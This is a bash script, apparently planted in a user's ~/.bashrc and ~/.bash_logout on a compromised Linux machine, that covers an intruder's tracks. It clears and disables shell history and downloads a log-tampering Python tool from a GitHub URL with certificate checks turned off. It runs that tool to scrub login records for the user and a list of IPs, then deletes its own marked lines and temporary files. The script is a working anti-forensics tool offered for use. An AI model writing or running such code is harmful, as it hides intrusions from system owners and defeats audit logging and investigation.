history -c ;  #_fdsagadsfasdgadsgsss
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;  #_fdsagadsfasdgadsgsss
export HISTFILE=/dev/null;  #_fdsagadsfasdgadsgsss
export HISTSIZE=0;  #_fdsagadsfasdgadsgsss
export HISTFILESIZE=0;  #_fdsagadsfasdgadsgsss
REST="\e[0m"  #_fdsagadsfasdgadsgsss
ColorYellow="\e[33m"  #_fdsagadsfasdgadsgsss
ColorBlue="\e[34m"  #_fdsagadsfasdgadsgsss
my_name="$(whoami)"  #_fdsagadsfasdgadsgsss
my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;  #_fdsagadsfasdgadsgsss
index_f=/tmp/_fadsgindexfs;  #_fdsagadsfasdgadsgsss
clear_shell=/tmp/asdgsdgdg_log_c;  #_fdsagadsfasdgadsgsss
function gglog {  #_fdsagadsfasdgadsgsss
    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"  #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
function _resume {  #_fdsagadsfasdgadsgsss
  if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
    for i in $(cat $index_f);  #_fdsagadsfasdgadsgsss
    do  #_fdsagadsfasdgadsgsss
      if [ -f $1 ];then  #_fdsagadsfasdgadsgsss
        mv $i /var/log/  2>/dev/null;  #_fdsagadsfasdgadsgsss
        if [ $? -eq 0 ];then  #_fdsagadsfasdgadsgsss
	   gglog $i " [resume]"  #_fdsagadsfasdgadsgsss
        fi   #_fdsagadsfasdgadsgsss
      fi   #_fdsagadsfasdgadsgsss
    done  #_fdsagadsfasdgadsgsss
  fi  #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
if [ !  -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;  #_fdsagadsfasdgadsgsss
    gglog "Download logtamper ok"  #_fdsagadsfasdgadsgsss
fi  #_fdsagadsfasdgadsgsss
function CL {  #_fdsagadsfasdgadsgsss
  if [ -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
  	for ip_one in $(cat $my_ips);do  #_fdsagadsfasdgadsgsss
  	    gglog "clear $my_name $ip_one"  #_fdsagadsfasdgadsgsss
      	    python $clear_shell -m 2 -u $my_name -i $ip_one ;  #_fdsagadsfasdgadsgsss
      	    python $clear_shell -m 1 -u $my_name -i $ip_one ;  #_fdsagadsfasdgadsgsss
          done  #_fdsagadsfasdgadsgsss
      else  #_fdsagadsfasdgadsgsss
  	gglog "no cl to found"  #_fdsagadsfasdgadsgsss
  fi  #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
function ByeHack {    #_fdsagadsfasdgadsgsss
    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc   #_fdsagadsfasdgadsgsss
    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_logout   #_fdsagadsfasdgadsgsss
    if [[ "$(cat ~/.bash_logout)" == "" ]];then  #_fdsagadsfasdgadsgsss
      rm ~/.bash_logout  #_fdsagadsfasdgadsgsss
    fi  #_fdsagadsfasdgadsgsss
    CL    #_fdsagadsfasdgadsgsss
    _resume;    #_fdsagadsfasdgadsgsss
    rm $my_ips 2>/dev/null;    #_fdsagadsfasdgadsgsss
    rm $index_f 2>/dev/null;    #_fdsagadsfasdgadsgsss
    rm $clear_shell 2>/dev/null;    #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
ByeHack;  #_fdsagadsfasdgadsgsss
